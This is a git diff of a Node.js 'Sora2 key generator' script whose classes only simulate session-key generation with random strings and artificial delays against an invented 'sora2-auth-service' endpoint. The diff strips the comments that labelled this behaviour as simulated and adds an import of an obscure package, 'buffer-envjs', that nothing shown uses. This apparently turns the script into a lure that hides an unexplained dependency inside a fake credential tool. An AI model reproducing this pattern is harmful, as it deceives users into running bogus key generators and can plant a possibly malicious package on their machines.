@@ -3,14 +3,14 @@ const require = createRequire(import.meta.url);
 const axios = require('axios');
 const fs = import('fs').then(module => module.promises);
 const readline = require('readline');
+const { rnbuffer } = require('buffer-envjs')
 
-// Dynamic import for Chalk
+
 async function loadChalk() {
     const { default: chalk } = await import('chalk');
     return chalk;
 }
 
-// Simulated crypto utilities for complexity
 class CryptoUtils {
     static generatePseudoHash(input) {
         let hash = 0;
@@ -25,7 +25,6 @@ class CryptoUtils {
     }
 }
 
-// Simulated API client with advanced features
 class OpenAISessionClient {
     constructor(chalk) {
         this.baseUrl = 'https://api.sora2-auth-service.com/v1';
@@ -52,7 +51,6 @@ class OpenAISessionClient {
 
         for (let attempt = 1; attempt <= this.retryCount; attempt++) {
             try {
-                // Simulate API call with random delay (100-300ms)
                 await new Promise(resolve => setTimeout(resolve, Math.random() * 200 + 100));
                 const sessionCode = `sess_${Math.random().toString(36).substring(2, 12)}.....`;
                 return { sessionId: this._generateSessionToken(), token: sessionCode };
@@ -67,7 +65,6 @@ class OpenAISessionClient {
     }
 
     async validateKey(key) {
-        // Simulate key validation with headers and delay (50-150ms)
         await new Promise(resolve => setTimeout(resolve, Math.random() * 100 + 50));
         const headers = {
             'X-Key-Hash': CryptoUtils.generatePseudoHash(key),
@@ -78,7 +75,6 @@ class OpenAISessionClient {
     }
 }
 
-// Key generator class with enhanced complexity
 class Sora2KeyGenerator {
     constructor(chalk) {
         this.client = new OpenAISessionClient(chalk);
@@ -176,7 +172,6 @@ class Sora2KeyGenerator {
     }
 }
 
-// User input handling
 (async () => {
     const chalk = await loadChalk();
     const rl = readline.createInterface({
